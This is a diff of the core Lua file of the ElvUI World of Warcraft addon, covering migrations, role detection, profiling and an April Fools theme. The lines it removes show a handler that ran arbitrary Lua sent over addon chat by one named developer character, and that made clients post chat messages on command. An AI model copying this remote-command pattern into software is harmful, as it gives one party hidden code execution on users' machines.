@@ -10,6 +10,7 @@ local twipe = table.wipe
 --Constants
 E.myclass = select(2, UnitClass("player"));
 E.myrace = select(2, UnitRace("player"))
+E.myfaction = select(2, UnitFactionGroup('player'))
 E.myname = UnitName("player");
 E.myguid = UnitGUID('player');
 E.version = GetAddOnMetadata("ElvUI", "Version"); 
@@ -19,6 +20,7 @@ E.resolution = GetCVar("gxResolution")
 E.screenheight = tonumber(match(E.resolution, "%d+x(%d+)"))
 E.screenwidth = tonumber(match(E.resolution, "(%d+)x+%d"))
 E.isMacClient = IsMacClient()
+E.LSM = LSM
 
 --Tables
 E["media"] = {};
@@ -166,7 +168,9 @@ function E:GetColorTable(data)
 	end
 end
 
-function E:UpdateMedia()	
+function E:UpdateMedia()
+	if not self.db['general'] or not self.private['general'] then return end --Prevent rare nil value errors
+	
 	--Fonts
 	self["media"].normFont = LSM:Fetch("font", self.db['general'].font)
 	self["media"].combatFont = LSM:Fetch("font", self.db['general'].dmgfont)
@@ -344,34 +348,39 @@ end
 function E:CheckRole()
 	local talentTree = GetSpecialization()
 	local IsInPvPGear = false;
+	local role
 	local resilperc = GetCombatRatingBonus(COMBAT_RATING_RESILIENCE_PLAYER_DAMAGE_TAKEN)
 	if resilperc > GetDodgeChance() and resilperc > GetParryChance() and UnitLevel('player') == MAX_PLAYER_LEVEL then
 		IsInPvPGear = true;
 	end
 	
-	self.role = nil;
-	
+
 	if type(self.ClassRole[self.myclass]) == "string" then
-		self.role = self.ClassRole[self.myclass]
+		role = self.ClassRole[self.myclass]
 	elseif talentTree then
-		self.role = self.ClassRole[self.myclass][talentTree]
+		role = self.ClassRole[self.myclass][talentTree]
 	end
 	
-	if self.role == "Tank" and IsInPvPGear then
-		self.role = "Melee"
+	if role == "Tank" and IsInPvPGear then
+		role = "Melee"
 	end
 	
-	if not self.role then
+	if not role then
 		local playerint = select(2, UnitStat("player", 4));
 		local playeragi	= select(2, UnitStat("player", 2));
 		local base, posBuff, negBuff = UnitAttackPower("player");
 		local playerap = base + posBuff + negBuff;
 
 		if (playerap > playerint) or (playeragi > playerint) then
-			self.role = "Melee";
+			role = "Melee";
 		else
-			self.role = "Caster";
+			role = "Caster";
 		end		
+	end
+
+	if(self.role ~= role) then
+		self.role = role
+		self.callbacks:Fire("RoleChanged")
 	end
 
 	if self.HealingClasses[self.myclass] ~= nil and self.myclass ~= 'PRIEST' then
@@ -452,32 +461,22 @@ function E:SendMessage()
 	end
 end
 
+local myName = E.myname.."-"..E.myrealm;
+myName = myName:gsub("%s+", "")
 local frames = {}
 local function SendRecieve(self, event, prefix, message, channel, sender)
 	if event == "CHAT_MSG_ADDON" then
-		if sender == E.myname then return end
+		if(sender == myName) then return end
 
-		if prefix == "ELVUI_VERSIONCHK" and not find(sender, "Elvz") and not E.recievedOutOfDateMessage then
-			if E.version ~= 'BETA' and tonumber(message) ~= nil and tonumber(message) > tonumber(E.version) then
-				E:Print(L["Your version of ElvUI is out of date. You can download the latest version from http://www.tukui.org"])
-				E.recievedOutOfDateMessage = true
-			end
-		elseif (prefix == 'ELVUI_DEV_SAYS' or prefix == 'ELVUI_DEV_CMD') and ((sender == 'Elvz' and E.myrealm == "Spirestone") or find(sender, "Elvz%-Spirestone")) then
-			if prefix == 'ELVUI_DEV_SAYS' then
-				local user, channel, msg, sendTo = split("#", message)
+		if prefix == "ELVUI_VERSIONCHK" and not E.recievedOutOfDateMessage then
+			if(tonumber(message) ~= nil and tonumber(message) > tonumber(E.version)) then
+				E:Print(L["ElvUI is out of date. You can download the newest version from www.tukui.org. Get premium membership and have ElvUI automatically updated with the Tukui Client!"])
 				
-				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
-					SendChatMessage(msg, channel, nil, sendTo)
+				if((tonumber(message) - tonumber(E.version)) >= 0.05) then
+					E:StaticPopup_Show("ELVUI_UPDATE_AVAILABLE")
 				end
-			else
-				local user, executeString = split("#", message)
-				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
-					local func, err = loadstring(executeString);
-					if not err then
-						E:Print(format("Developer Executed: %s", executeString))
-						func()
-					end
-				end			
+
+				E.recievedOutOfDateMessage = true
 			end
 		end
 	else
@@ -486,8 +485,6 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 end
 
 RegisterAddonMessagePrefix('ELVUI_VERSIONCHK')
-RegisterAddonMessagePrefix('ELVUI_DEV_SAYS')
-RegisterAddonMessagePrefix('ELVUI_DEV_CMD')
 
 local f = CreateFrame('Frame')
 f:RegisterEvent("GROUP_ROSTER_UPDATE")
@@ -503,12 +500,13 @@ function E:UpdateAll(ignoreInstall)
 	LibStub('LibDualSpec-1.0'):EnhanceDatabase(self.data, "ElvUI")
 	self.db = self.data.profile;
 	self.global = self.data.global;
-	
+	self:DBConversions()
 	self.db.theme = nil;
 	self.db.install_complete = nil;	
 	
 	self:SetMoversPositions()
 	self:UpdateMedia()
+	self:UpdateCooldownSettings()
 	
 	local UF = self:GetModule('UnitFrames')
 	UF.db = self.db.unitframe
@@ -559,7 +557,13 @@ function E:UpdateAll(ignoreInstall)
 	self:GetModule('Auras').db = self.db.auras
 	self:GetModule('Tooltip').db = self.db.tooltip
 	
-	E:GetModule('Auras'):UpdateAllHeaders()
+	if(ElvUIPlayerBuffs) then
+		E:GetModule('Auras'):UpdateHeader(ElvUIPlayerBuffs)
+	end
+
+	if(ElvUIPlayerDebuffs) then
+		E:GetModule('Auras'):UpdateHeader(ElvUIPlayerDebuffs)
+	end
 	
 	if self.private.install_complete == nil or (self.private.install_complete and type(self.private.install_complete) == 'boolean') or (self.private.install_complete and type(tonumber(self.private.install_complete)) == 'number' and tonumber(self.private.install_complete) <= 3.83) then
 		if not ignoreInstall then
@@ -571,14 +575,13 @@ function E:UpdateAll(ignoreInstall)
 	
 	self:UpdateBorderColors()
 	self:UpdateBackdropColors()
-	self:UpdateFrameTemplates()
+	--self:UpdateFrameTemplates()
 	
 	local LO = E:GetModule('Layout')
 	LO:ToggleChatPanels()	
 	LO:BottomPanelVisibility()
 	LO:TopPanelVisibility()
-	
-
+		
 	collectgarbage('collect');
 end
 
@@ -640,7 +643,7 @@ function E:InitializeInitialModules()
 		local module = self:GetModule(module, true)
 		if module and module.Initialize then
 			local _, catch = pcall(module.Initialize, module)
-			if catch and GetCVarBool('scriptErrors') == 1 then
+			if catch and GetCVarBool('scriptErrors') == true then
 				ScriptErrorsFrame_OnError(catch, false)
 			end
 		end
@@ -658,7 +661,8 @@ function E:InitializeModules()
 		local module = self:GetModule(module)
 		if module.Initialize then
 			local _, catch = pcall(module.Initialize, module)
-			if catch and GetCVarBool('scriptErrors') == 1 then
+
+			if catch and GetCVarBool('scriptErrors') == true then
 				ScriptErrorsFrame_OnError(catch, false)
 			end
 		end
@@ -667,7 +671,66 @@ end
 
 --DATABASE CONVERSIONS
 function E:DBConversions()
+	if(self.private.actionbar) then
+		if(self.private.actionbar.enablecd ~= nil) then
+			self.private.cooldown.enable = self.private.actionbar.enablecd
+			self.private.actionbar.enablecd = nil
+		end
+		
+		if(self.db.actionbar.treshold ~= nil) then
+			self.db.cooldown.threshold = self.db.actionbar.treshold
+			self.db.actionbar.treshold = nil
+		end
+		
+		if(self.db.actionbar.expiringcolor ~= nil) then
+			self.db.cooldown.expiringColor = self.db.actionbar.expiringcolor
+			self.db.actionbar.expiringcolor = nil
+		end
 
+		if(self.db.actionbar.secondscolor ~= nil) then
+			self.db.cooldown.secondsColor = self.db.actionbar.secondscolor
+			self.db.actionbar.secondscolor = nil
+		end	
+		
+		if(self.db.actionbar.minutescolor ~= nil) then
+			self.db.cooldown.minutesColor = self.db.actionbar.minutescolor
+			self.db.actionbar.minutescolor = nil
+		end		
+		
+		if(self.db.actionbar.hourscolor ~= nil) then
+			self.db.cooldown.hoursColor = self.db.actionbar.hourscolor
+			self.db.actionbar.hourscolor = nil
+		end	
+		
+		if(self.db.actionbar.dayscolor ~= nil) then
+			self.db.cooldown.daysColor = self.db.actionbar.dayscolor
+			self.db.actionbar.dayscolor = nil
+		end		
+	end
+
+	if E.global.unitframe.aurafilters['Whitelist (Strict)'].spells then
+		for k, v in pairs(E.global.unitframe.aurafilters['Whitelist (Strict)'].spells) do
+			if type(v) == 'table' then
+				for k_,v_ in pairs(v) do
+					if k_ == 'spellID' and type(v_) ~= 'number' then
+						E.global.unitframe.aurafilters['Whitelist (Strict)']['spells'][k][k_] = tonumber(v_)
+					end
+				end
+			end
+		end
+	end
+
+	self.db.unitframe.units.raid10 = nil
+	self.db.unitframe.units.raid25 = nil
+	
+	if not E.db.bagsOffsetFixed then
+		if E.db.bags.xOffset ~= P['bags']['xOffset'] then
+			E.db.bags.xOffsetBank = E.db.bags.xOffset
+			E.db.bags.yOffsetBank = E.db.bags.yOffset
+			E.db.bags.xOffset = E.db.bags.xOffset * (-1) --Change positive value to negative or vice versa
+		end
+		E.db.bagsOffsetFixed = true
+	end
 end
 
 function E:StopMassiveShake()
@@ -688,7 +751,7 @@ function E:StopMassiveShake()
 	end
 
 	E.global.aprilFools = true;
-	E:StaticPopup_Hide("APRIL_FOOLS")
+	E:StaticPopup_Hide("APRIL_FOOLS2013")
 	twipe(self.massiveShakeObjects)
 	DoEmote("Dance")
 end
@@ -757,6 +820,296 @@ function E:BeginFoolsDayEvent()
 	end
 end
 
+local CPU_USAGE = {}
+local function CompareCPUDiff(module, minCalls)
+	local greatestUsage, greatestCalls, greatestName
+	local greatestDiff = 0;
+	local mod = E:GetModule(module, true) or E
+
+	for name, oldUsage in pairs(CPU_USAGE) do
+		local newUsage, calls = GetFunctionCPUUsage(mod[name], true)
+		local differance = newUsage - oldUsage
+		
+		if differance > greatestDiff and calls > (minCalls or 15) then
+			greatestName = name
+			greatestUsage = newUsage
+			greatestCalls = calls
+			greatestDiff = differance
+		end
+	end
+
+	if(greatestName) then
+		E:Print(greatestName.. " had the CPU usage of: "..greatestUsage.."ms. And has been called ".. greatestCalls.." times.")
+	end
+end
+
+function E:GetTopCPUFunc(msg)
+	local module, delay, minCalls = msg:match("^([^%s]+)%s+(.*)$")
+
+	module = module == "nil" and nil or module
+	delay = delay == "nil" and nil or tonumber(delay)
+	minCalls = minCalls == "nil" and nil or tonumber(minCalls)
+
+	twipe(CPU_USAGE)
+	local mod = self:GetModule(module, true) or self
+	for name, func in pairs(mod) do
+		if type(mod[name]) == "function" and name ~= "GetModule" then
+			CPU_USAGE[name] = GetFunctionCPUUsage(mod[name], true)
+		end
+	end
+
+	self:Delay(delay or 5, CompareCPUDiff, module, minCalls)
+	self:Print("Calculating CPU Usage..")
+end
+
+function E:CheckForFoolsDayFuckup(secondCheck)
+	local t = self.db.tempSettings
+	if(not t and not secondCheck) then t = self.db.general end
+	if(t and t.backdropcolor)then
+		return self:Round(t.backdropcolor.r, 2) == 0.87 and self:Round(t.backdropcolor.g, 2) == 0.3 and self:Round(t.backdropcolor.b, 2) == 0.74
+	end
+end
+
+function E:AprilFoolsFuckupFix()
+	local c = P.general.backdropcolor
+	self.db.general.backdropcolor = {r = c.r, g = c.g, b = c.b}
+	
+	c = P.general.backdropfadecolor
+	self.db.general.backdropfadecolor = {r = c.r, g = c.g, b = c.b}
+
+	c = P.general.bordercolor
+	self.db.general.bordercolor = {r = c.r, g = c.g, b = c.b}	
+	
+	c = P.general.valuecolor
+	self.db.general.valuecolor = {r = c.r, g = c.g, b = c.b}
+		
+	self.db.chat.panelBackdropNameLeft = ""
+	self.db.chat.panelBackdropNameRight = ""
+	
+	c = P.unitframe.colors.health
+	self.db.unitframe.colors.health = {r = c.r, g = c.g, b = c.b}	
+	
+	c = P.unitframe.colors.castColor
+	self.db.unitframe.colors.castColor = {r = c.r, g = c.g, b = c.b}
+	self.db.unitframe.colors.transparentCastbar = false
+	
+	c = P.unitframe.colors.castColor
+	self.db.unitframe.colors.auraBarBuff = {r = c.r, g = c.g, b = c.b}
+	self.db.unitframe.colors.transparentAurabars = false
+	
+
+	if(HelloKittyLeft) then
+		HelloKittyLeft:Hide()
+		HelloKittyRight:Hide()
+		return
+	end	
+	
+	self.db.tempSettings = nil	
+	self:UpdateAll()
+end
+
+function E:SetupAprilFools2014()
+	if not self.db.tempSettings then
+		self.db.tempSettings = {}
+	end
+	
+
+	--Store old settings
+	local t = self.db.tempSettings
+	local c = self.db.general.backdropcolor
+	if(self:CheckForFoolsDayFuckup()) then
+		E:AprilFoolsFuckupFix()
+	else
+		self.oldEnableAllSound = GetCVar("Sound_EnableAllSound")
+		self.oldEnableMusic = GetCVar("Sound_EnableMusic")
+	
+		t.backdropcolor = {r = c.r, g = c.g, b = c.b}
+		c = self.db.general.backdropfadecolor
+		t.backdropfadecolor = {r = c.r, g = c.g, b = c.b, a = c.a}
+		c = self.db.general.bordercolor
+		t.bordercolor = {r = c.r, g = c.g, b = c.b}	
+		c = self.db.general.valuecolor
+		t.valuecolor = {r = c.r, g = c.g, b = c.b}		
+		
+		t.panelBackdropNameLeft = self.db.chat.panelBackdropNameLeft
+		t.panelBackdropNameRight = self.db.chat.panelBackdropNameRight
+		
+		c = self.db.unitframe.colors.health
+		t.health = {r = c.r, g = c.g, b = c.b}		
+		
+		c = self.db.unitframe.colors.castColor
+		t.castColor = {r = c.r, g = c.g, b = c.b}	
+		t.transparentCastbar = self.db.unitframe.colors.transparentCastbar
+		
+		c = self.db.unitframe.colors.auraBarBuff
+		t.auraBarBuff = {r = c.r, g = c.g, b = c.b}	
+		t.transparentAurabars = self.db.unitframe.colors.transparentAurabars	
+		
+		--Apply new settings
+		self.db.general.backdropfadecolor = {r =131/255, g =36/255, b = 130/255, a = 0.36}
+		self.db.general.backdropcolor = {r = 223/255, g = 76/255, b = 188/255}
+		self.db.general.bordercolor = {r = 223/255, g = 217/255, b = 47/255}
+		self.db.general.valuecolor = {r = 223/255, g = 217/255, b = 47/255}
+		
+		self.db.chat.panelBackdropNameLeft = [[Interface\AddOns\ElvUI\media\textures\helloKittyChat.tga]]
+		self.db.chat.panelBackdropNameRight = [[Interface\AddOns\ElvUI\media\textures\helloKittyChat.tga]]
+		
+		self.db.unitframe.colors.castColor = {r = 223/255, g = 76/255, b = 188/255}
+		self.db.unitframe.colors.transparentCastbar = true
+		
+		self.db.unitframe.colors.auraBarBuff = {r = 223/255, g = 76/255, b = 188/255}
+		self.db.unitframe.colors.transparentAurabars = true
+		
+		self.db.unitframe.colors.health = {r = 223/255, g = 76/255, b = 188/255}
+		
+		SetCVar("Sound_EnableAllSound", 1)
+		SetCVar("Sound_EnableMusic", 1)
+		PlayMusic([[Interface\AddOns\ElvUI\media\sounds\helloKitty.mp3]])		
+		self:ScheduleTimer('EndAprilFoolsDay2014', 59)
+		
+		self.db.general.kittys = true
+		self:CreateKittys()
+		
+		self:UpdateAll()
+	end
+end
+
+function E:EndAprilFoolsDay2014()
+	StopMusic()
+	SetCVar("Sound_EnableAllSound", self.oldEnableAllSound)
+	SetCVar("Sound_EnableMusic", self.oldEnableMusic)
+
+	E.global.aprilFools = true;
+	E:StaticPopup_Show("APRIL_FOOLS_END")
+end
+
+function E:RestoreAprilFools()
+	--Store old settings
+	self.db.general.kittys = false
+	if(HelloKittyLeft) then
+		HelloKittyLeft:Hide()
+		HelloKittyRight:Hide()
+	end		
+	
+	if not(self.db.tempSettings) then return end
+	if(self:CheckForFoolsDayFuckup()) then
+		self:AprilFoolsFuckupFix()
+		self.db.tempSettings = nil
+		return
+	end
+	local c = self.db.tempSettings.backdropcolor
+	self.db.general.backdropcolor = {r = c.r, g = c.g, b = c.b}
+	
+	c = self.db.tempSettings.backdropfadecolor
+	self.db.general.backdropfadecolor = {r = c.r, g = c.g, b = c.b}
+
+	c = self.db.tempSettings.bordercolor
+	self.db.general.bordercolor = {r = c.r, g = c.g, b = c.b}	
+	
+	c = self.db.tempSettings.valuecolor
+	self.db.general.valuecolor = {r = c.r, g = c.g, b = c.b}
+		
+	self.db.chat.panelBackdropNameLeft = self.db.tempSettings.panelBackdropNameLeft
+	self.db.chat.panelBackdropNameRight = self.db.tempSettings.panelBackdropNameRight
+	
+	c = self.db.tempSettings.health
+	self.db.unitframe.colors.health = {r = c.r, g = c.g, b = c.b}	
+	
+	c = self.db.tempSettings.castColor
+	self.db.unitframe.colors.castColor = {r = c.r, g = c.g, b = c.b}
+	self.db.unitframe.colors.transparentCastbar = self.db.tempSettings.transparentCastbar
+	
+	c = self.db.tempSettings.auraBarBuff
+	self.db.unitframe.colors.auraBarBuff = {r = c.r, g = c.g, b = c.b}
+	self.db.unitframe.colors.transparentAurabars = self.db.tempSettings.transparentAurabars
+	
+
+	self.db.tempSettings = nil
+	
+	self:UpdateAll()
+end
+
+function E:AprilFoolsToggle()
+	if(HelloKittyLeft and HelloKittyLeft:IsShown()) then
+		self:RestoreAprilFools()
+		self.global.aprilFools = true
+	else
+		self:StaticPopup_Show("APRIL_FOOLS")
+	end
+end
+
+local function OnDragStart(self)
+	self:StartMoving()
+end
+
+local function OnDragStop(self)
+	self:StopMovingOrSizing()
+end
+
+local function OnUpdate(self, elapsed)
+	if(self.elapsed and self.elapsed > 0.1) then
+		self.tex:SetTexCoord((self.curFrame - 1) * 0.1, 0, (self.curFrame - 1) * 0.1, 1, self.curFrame * 0.1, 0, self.curFrame * 0.1, 1)
+
+		if(self.countUp) then
+			self.curFrame = self.curFrame + 1
+		else
+			self.curFrame = self.curFrame - 1
+		end
+		
+		if(self.curFrame > 10) then
+			self.countUp = false
+			self.curFrame = 9
+		elseif(self.curFrame < 1) then
+			self.countUp = true
+			self.curFrame = 2
+		end
+		self.elapsed = 0
+	else
+		self.elapsed = (self.elapsed or 0) + elapsed
+	end	
+end
+
+function E:CreateKittys()
+	if(HelloKittyLeft) then
+		HelloKittyLeft:Show()
+		HelloKittyRight:Show()
+		return
+	end
+	local helloKittyLeft = CreateFrame("Frame", "HelloKittyLeft", UIParent)
+	helloKittyLeft:SetSize(120, 128)
+	helloKittyLeft:SetMovable(true)
+	helloKittyLeft:EnableMouse(true)
+	helloKittyLeft:RegisterForDrag("LeftButton")
+	helloKittyLeft:SetPoint("BOTTOMLEFT", LeftChatPanel, "BOTTOMRIGHT", 2, -4)
+	helloKittyLeft.tex = helloKittyLeft:CreateTexture(nil, "OVERLAY")
+	helloKittyLeft.tex:SetAllPoints()
+	helloKittyLeft.tex:SetTexture("Interface\\AddOns\\ElvUI\\media\\textures\\helloKitty.tga")
+	helloKittyLeft.tex:SetTexCoord(0, 0, 0, 1, 0, 0, 0, 1)
+	helloKittyLeft.curFrame = 1
+	helloKittyLeft.countUp = true
+	helloKittyLeft:SetClampedToScreen(true)
+	helloKittyLeft:SetScript("OnDragStart", OnDragStart)
+	helloKittyLeft:SetScript("OnDragStop", OnDragStop)
+	helloKittyLeft:SetScript("OnUpdate", OnUpdate)
+
+	local helloKittyRight = CreateFrame("Frame", "HelloKittyRight", UIParent)
+	helloKittyRight:SetSize(120, 128)
+	helloKittyRight:SetMovable(true)
+	helloKittyRight:EnableMouse(true)
+	helloKittyRight:RegisterForDrag("LeftButton")
+	helloKittyRight:SetPoint("BOTTOMRIGHT", RightChatPanel, "BOTTOMLEFT", -2, -4)
+	helloKittyRight.tex = helloKittyRight:CreateTexture(nil, "OVERLAY")
+	helloKittyRight.tex:SetAllPoints()
+	helloKittyRight.tex:SetTexture("Interface\\AddOns\\ElvUI\\media\\textures\\helloKitty.tga")
+	helloKittyRight.tex:SetTexCoord(0, 0, 0, 1, 0, 0, 0, 1)
+	helloKittyRight.curFrame = 10
+	helloKittyRight.countUp = false
+	helloKittyRight:SetClampedToScreen(true)
+	helloKittyRight:SetScript("OnDragStart", OnDragStart)
+	helloKittyRight:SetScript("OnDragStop", OnDragStop)
+	helloKittyRight:SetScript("OnUpdate", OnUpdate)
+end
+
 function E:Initialize()
 	twipe(self.db)
 	twipe(self.global)
@@ -780,7 +1133,7 @@ function E:Initialize()
 	self:LoadCommands(); --Load Commands
 	self:InitializeModules(); --Load Modules	
 	self:LoadMovers(); --Load Movers
-
+	self:UpdateCooldownSettings()
 	self.initialized = true
 	
 	if self.private.install_complete == nil then
@@ -791,10 +1144,12 @@ function E:Initialize()
 		E.global.aprilFools = nil;
 	end
 	
-	if E:IsFoolsDay() then
+	if(self:CheckForFoolsDayFuckup()) then
+		E:AprilFoolsFuckupFix()
+	elseif E:IsFoolsDay() and not self.db.general.kittys then
 		E:StaticPopup_Show('APRIL_FOOLS')
 	end
-
+	
 	self:UpdateMedia()
 	self:UpdateFrameTemplates()
 	self:RegisterEvent("ACTIVE_TALENT_GROUP_CHANGED", "CheckRole");
@@ -810,7 +1165,12 @@ function E:Initialize()
 	if self.myclass == "DRUID" then
 		self:RegisterEvent("SPELLS_CHANGED")
 	end
-
+	
+	if self.db.general.kittys then
+		self:CreateKittys()
+		self:Delay(5, self.Print, self, L["Type /aprilfools to revert to old settings."])
+	end	
+	
 	self:Tutorials()
 	self:GetModule('Minimap'):UpdateSettings()
 	self:RefreshModulesDB()
